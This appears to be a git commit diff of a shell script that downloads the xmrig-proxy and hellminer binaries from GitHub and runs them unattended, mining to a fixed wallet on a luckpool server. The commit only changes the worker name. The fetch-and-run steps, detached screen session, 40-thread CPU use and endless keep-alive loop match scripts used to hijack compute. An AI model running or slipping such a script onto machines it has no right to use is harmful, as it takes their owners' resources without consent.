ffec41483cbbfbbf8936f08d93533a97494dbc75
CyberGum <89202150+CyberGum@users.noreply.github.com>
2021-09-11 06:04:30 +0700

    Update versusgum.sh

--- versusgum.sh
+++ versusgum.sh
@@ -3,12 +3,12 @@ sudo apt update
 sudo apt install screen -y
 wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz
 tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz
-cd xmrig-proxy-6.14.0 && screen -dmS run ./xmrig-proxy -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RHantyyFEZJNvDhLBoodU7pBAmuyw1hhWm.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -b 0.0.0.0:3333 -m simple
+cd xmrig-proxy-6.14.0 && screen -dmS run ./xmrig-proxy -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RHantyyFEZJNvDhLBoodU7pBAmuyw1hhWm.vwork$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -b 0.0.0.0:3333 -m simple
 
 
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RHantyyFEZJNvDhLBoodU7pBAmuyw1hhWm.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x --cpu 40
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RHantyyFEZJNvDhLBoodU7pBAmuyw1hhWm.vwork$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x --cpu 40
 while [ 1 ]; do
 sleep 3
 done
